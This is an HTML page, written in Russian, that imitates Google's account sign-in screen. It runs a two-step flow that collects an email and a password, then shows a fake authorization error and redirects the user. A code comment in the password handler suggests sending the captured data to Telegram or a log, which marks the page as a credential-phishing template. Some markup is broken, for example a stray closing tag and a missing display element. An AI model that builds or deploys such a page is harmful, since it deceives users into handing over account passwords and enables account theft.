<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход — Google Аккаунты</title>
    <link href="fonts.googleapis.com" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', arial, sans-serif;
        }

        body {
            background-color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #202124;
        }

        .login-box {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }

        @media (max-width: 450px) {
            .login-box {
                border: none;
                padding: 24px 24px;
            }
        }

        .google-logo {
            width: 75px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 16px;
            margin-bottom: 30px;
        }

        /* Поля ввода */
        .input-group {
            position: relative;
            margin-bottom: 25px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border 0.2s;
        }

        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px; /* компенсируем толщину рамки */
        }

        .forgot-link {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            display: inline-block;
            margin-top: 9px;
        }

        .info-text {
            color: #5f6368;
            font-size: 14px;
            line-height: 1.4;
            margin-top: 40px;
            text-align: left;
        }

        /* Кнопки */
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }

        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }

        .btn-next {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-next:hover {
            background-color: #1765cc;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        /* Скрытый блок пароля */
        #password-step {
            display: none;
        }

        .user-identity {
            display: inline-flex;
            align-items: center;
            padding: 5px 10px;
            border: 1px solid #dadce0;
            border-radius: 20px;
            margin-bottom: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <img src="upload.wikimedia.org" alt="Google" class="google-logo">
        
        <!-- ШАГ 1: ПОЧТА -->
        <div id="email-step">
            <h1>Вход</h1>
            <p class="subtitle">Используйте аккаунт Google</p>
            
            <div class="input-group">
                <input type="email" id="email" placeholder="Телефон или адрес эл. почты" required>
                <a href="#" class="forgot-link">Забыли адрес эл. почты?</a>
            </div>

            <p class="info-text">
                Работаете на чужом компьютере? Используйте режим инкогнито, чтобы войти в аккаунт. 
                <a href="#" style="color: #1a73e8; text-decoration: none;">Подробнее…</a>
            </p>

            <div class="buttons">
                <a href="#" class="create-account">Создать аккаунт</a>
                <button class="btn-next" onclick="nextStep()">Далее</button>
            </div>
        </div>

        <!-- ШАГ 2: ПАРОЛЬ (Скрыт изначально) -->
        <div id="password-step">
            <h1>Добро пожаловать!</h1>
            email@gmail.com</div>
            
            <div class="input-group">
                <input type="password" id="password" placeholder="Введите пароль" required>
                <div style="margin-top: 10px; text-align: left;">
                    <input type="checkbox" id="show-pass" style="width: auto;"> 
                    <label for="show-pass" style="font-size: 14px; cursor: pointer;">Показать пароль</label>
                </div>
            </div>

            <div class="buttons" style="justify-content: flex-end;">
                <button class="btn-next" onclick="finishLogin()">Подтвердить</button>
            </div>
        </div>
    </div>

    <script>
        function nextStep() {
            const email = document.getElementById('email').value;
            if (email.length > 5) {
                document.getElementById('email-step').style.display = 'none';
                document.getElementById('password-step').style.display = 'block';
                document.getElementById('display-email').innerText = email;
            } else {
                alert('Введите корректный email');
            }
        }

        function finishLogin() {
            const pass = document.getElementById('password').value;
            if (pass.length > 3) {
                // Здесь можно добавить отправку данных в телеграм или лог
                alert('Ошибка авторизации. Попробуйте позже.');
                window.location.href = "index.html"; // Возврат на главную
            } else {
                alert('Введите пароль');
            }
        }
    </script>
</body>
</html>
